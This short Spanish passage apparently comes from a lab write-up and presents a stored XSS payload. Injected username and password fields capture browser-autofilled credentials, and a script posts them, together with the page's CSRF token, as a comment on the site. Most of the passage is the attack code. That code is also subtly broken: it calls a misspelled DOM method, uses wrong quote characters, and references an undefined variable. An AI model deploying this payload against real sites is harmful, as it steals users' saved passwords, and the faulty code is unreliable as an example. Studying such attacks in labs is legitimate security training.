En este caso nos vamos a provechar de que el navegador confía en la pagina que está visitando y rellena automáticamente los inputs con las credenciales, para esto haremos dos etiquetas input correspondientes a la contraseña y el usuario:

```html
<input type="text" name="username">
<input type="password" name="password" onchange="script()">
<script>
function script(){
var token = document.getElementByName('csrf')[0].value;
var usuario = document.getElementByName('username')[0].value;
var contraseña = document.getElementByName('password')[0].value;

var data = new FormData();

data.append('csrf', token);
data.append('postId', 7);
data.append('comment', ´{usuario}:{contraseña}´);
data.append('name', 'victima');
data.append('email', 'foo@foo.com');
data.append('website', 'http://foo.com');

fetch('/comments', {
	method: 'POST',
	mode: 'no-cors',
	body: body

});

}
</script>


```
